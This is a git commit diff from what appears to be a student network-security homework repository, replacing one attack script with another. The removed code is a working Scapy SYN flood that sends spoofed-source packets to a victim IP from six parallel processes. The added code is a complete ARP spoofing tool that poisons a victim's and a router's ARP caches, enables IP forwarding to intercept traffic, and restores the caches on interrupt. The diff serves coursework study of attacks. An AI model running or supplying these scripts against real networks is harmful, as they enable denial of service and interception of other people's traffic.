424ff53648fbad7a11353ed30c94d6c6c556a5e0
minseo <raichal2000@naver.com>
2023-04-13 00:37:40 +0900

    change connection flood

--- src/HW4/TCP_connection_flooding.py
+++ src/HW4/TCP_connection_flooding.py
@@ -1,42 +1,60 @@
-from multiprocessing import Process
+
+
+# sudo python arp_spoof.py -v 192.168.0.3 -r 192.168.0.1
+#!/usr/bin/python
 from scapy.all import *
-import random
-
-# 대상 IP 주소와 포트
-Attacker_ip = "111.111.111.111" #Attacker Ip adress
-target_ip = "192.168.0.74" #victim Ip adress
-target_port = 2000 #victim port
-
-#물리계층별 패킷
-l3 = IP(src = Attacker_ip,dst=target_ip)
-l4 = TCP(dport=target_port, flags = "S")
-
-# 공격 대상 패킷
-#target_packet = l3/l4
-
-# 패킷을 보내는 함수
-def send_packets(adds):
-    for i in range(10000):
-        temp_l4 = TCP(dport=i+adds, flags = "S")
-        target_packet = l3/temp_l4
-        send(target_packet, verbose=False)
-        target_packet.show()
-
-# 공격 실행
-
-
-
-if __name__ == '__main__':
-    th1 = Process(target=send_packets, args=(0,))
-    th2 = Process(target=send_packets, args=(10000,))
-    th3 = Process(target=send_packets, args=(20000,))
-    th4 = Process(target=send_packets, args=(30000,))
-    th5 = Process(target=send_packets, args=(40000,))
-    th6 = Process(target=send_packets, args=(50000,))
-
-    th1.start()
-    th2.start()
-    th3.start()
-    th4.start()
-    th5.start()
-    th6.start()
+import argparse
+import signal
+import sys
+import logging
+import time
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
+    parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
+    return parser.parse_args()
+def originalMAC(host):
+    # ping is optional (sends a WHO_HAS request)
+    os.popen('ping -c 1 %s' % host)
+    # grep with a space at the end of IP address to make sure you get a single line
+    fields = os.popen('grep "%s " /proc/net/arp' % host).read().split()
+    if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
+        return fields[3]
+    else:
+        print('no response from', host)
+def poison(routerIP, victimIP, routerMAC, victimMAC):
+    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
+    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
+def restore(routerIP, victimIP, routerMAC, victimMAC):
+    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
+    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+    sys.exit("losing...")
+def main(args):
+    if os.geteuid() != 0:
+        sys.exit("[!] Please run as root")
+    routerIP = args.routerIP
+    print ('routerIP : ' + routerIP)
+    victimIP = args.victimIP
+    print ('victimIP : ' + victimIP)
+    routerMAC = originalMAC(args.routerIP)
+    print ('routerMAC : ' + routerMAC)
+    #routerMAC = "00:26:66:7B:E6:89"
+    #victimMAC = "8C:18:D9:2B:29:18"
+    victimMAC = originalMAC(args.victimIP)
+    print ('victimMAC : ' + victimMAC)
+    if routerMAC == None:
+        sys.exit("Could not find router MAC address. Closing....")
+    if victimMAC == None:
+        sys.exit("Could not find victim MAC address. Closing....")
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+        ipf.write('1\n')
+    def signal_handler(signal, frame):
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+            ipf.write('0\n')
+        restore(routerIP, victimIP, routerMAC, victimMAC)
+    signal.signal(signal.SIGINT, signal_handler)
+    while 1:
+        poison(routerIP, victimIP, routerMAC, victimMAC)
+        time.sleep(1.5)
+main(parse_args())
